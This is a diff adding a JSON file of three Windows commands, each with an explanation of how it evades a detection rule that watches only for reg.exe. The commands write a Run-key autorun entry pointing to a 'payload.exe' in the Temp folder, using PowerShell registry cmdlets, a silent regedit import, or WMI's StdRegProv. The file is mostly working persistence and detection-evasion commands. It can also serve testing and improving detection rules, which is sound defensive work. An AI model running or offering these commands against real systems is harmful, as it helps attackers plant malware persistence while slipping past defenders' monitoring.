@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'UpdateTask' -Value 'C:\\Windows\\Temp\\payload.exe'\"",
+    "explanation": "Bypasses the rule entirely because selection_1 strictly looks for process creation where the Image ends with '\\reg.exe'. Using PowerShell's built-in registry cmdlets achieves the exact same persistence without invoking reg.exe."
+  },
+  {
+    "output": "regedit.exe /s C:\\Windows\\Temp\\persistence.reg",
+    "explanation": "Bypasses selection_1 by using a different native Windows utility. The rule specifically monitors 'reg.exe'. By using 'regedit.exe' to silently import a .reg file containing the Autorun keys, the detection is evaded."
+  },
+  {
+    "output": "wmic /NAMESPACE:\\\\root\\default Class StdRegProv Call SetStringValue hDefKey=\"&H80000001\" sSubKeyName=\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" sValueName=\"UpdateTask\" sValue=\"C:\\Windows\\Temp\\payload.exe\"",
+    "explanation": "Bypasses the rule by using Windows Management Instrumentation (WMI) to interact with the registry (via WMI StdRegProv class). This executes through wmic.exe or WmiPrvSE.exe, completely circumventing the strict '\\reg.exe' requirement."
+  }
+]
